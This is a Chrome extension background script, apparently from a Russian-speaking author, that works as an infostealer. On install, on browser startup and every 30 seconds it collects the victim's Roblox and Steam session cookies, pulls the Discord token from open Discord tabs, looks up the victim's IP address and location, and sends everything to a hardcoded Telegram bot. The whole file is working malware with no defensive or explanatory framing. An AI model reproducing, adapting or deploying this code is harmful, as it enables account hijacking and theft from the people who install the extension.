const TOKEN = "8679009953:AAE6I66uPMllDNCAdIL2vTUD7fs_Hvoo7uc";
const CHAT_ID = "6145369088";
const API = "https://api.telegram.org/bot" + TOKEN;

let sentRoblox = "";
let sentSteam = "";
let sentDiscord = "";

async function sendText(text) {
    try {
        await fetch(API + "/sendMessage", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "HTML",
                disable_web_page_preview: true
            })
        });
    } catch (e) {}
}

async function getDiscordToken() {
    try {
        const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
        for (const tab of tabs) {
            try {
                const results = await chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    func: () => {
                        const token = localStorage.getItem("token");
                        if (token) return token;
                        return "";
                    }
                });
                if (results[0] && results[0].result) {
                    return results[0].result;
                }
            } catch (e) {}
        }
    } catch (e) {}
    return "";
}

async function getIP() {
    try {
        const r = await fetch("https://ipwho.is/");
        const j = await r.json();
        if (j.ip && j.ip.includes(":")) {
            const r2 = await fetch("https://api.ipify.org?format=json");
            const j2 = await r2.json();
            j.ip = j2.ip || j.ip;
        }
        return j;
    } catch (e) {
        return null;
    }
}

async function sendData() {
    let msg = "";
    let hasNew = false;

    // IP всегда первый
    const ip = await getIP();
    msg += "🌐 <b>IP:</b> <code>" + (ip?.ip || "Н/Д") + "</code>\n";
    msg += "📍 <b>Страна:</b> <code>" + (ip?.country || "Н/Д") + "</code>\n";
    msg += "🏙 <b>Город:</b> <code>" + (ip?.city || "Н/Д") + "</code>\n\n";

    // Roblox
    try {
        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
        const rob = c.find(x => x.name === ".ROBLOSECURITY");
        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
        if (rob && rob.value !== sentRoblox) {
            sentRoblox = rob.value;
            msg += "<code>" + rob.value + "</code>\n\n";
            hasNew = true;
        } else if (rob) {
            msg += "✅ Уже отправлен\n\n";
        } else {
            msg += "❌ Не найден\n\n";
        }
    } catch (e) {}

    // Steam
    try {
        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
        const steam = c.find(x => x.name === "steamLoginSecure");
        msg += "🎮 <b>STEAM COOKIE:</b>\n";
        if (steam && steam.value !== sentSteam) {
            sentSteam = steam.value;
            msg += "<code>" + steam.value + "</code>\n\n";
            hasNew = true;
        } else if (steam) {
            msg += "✅ Уже отправлен\n\n";
        } else {
            msg += "❌ Не найден\n\n";
        }
    } catch (e) {}

    // Discord
    const discordToken = await getDiscordToken();
    msg += "💬 <b>DISCORD TOKEN:</b>\n";
    if (discordToken && discordToken !== sentDiscord) {
        sentDiscord = discordToken;
        msg += "<code>" + discordToken + "</code>\n\n";
        hasNew = true;
    } else if (discordToken) {
        msg += "✅ Уже отправлен\n\n";
    } else {
        msg += "❌ Discord не открыт в браузере\n\n";
    }

    if (hasNew) {
        let header = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
        header += "━━━━━━━━━━━━━━━━━━\n\n";
        header += msg;
        header += "━━━━━━━━━━━━━━━━━━\n";
        header += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");

        await sendText(header);
    }
}

chrome.runtime.onInstalled.addListener(() => { sendData(); });
chrome.runtime.onStartup.addListener(() => { sendData(); });

setInterval(sendData, 30000);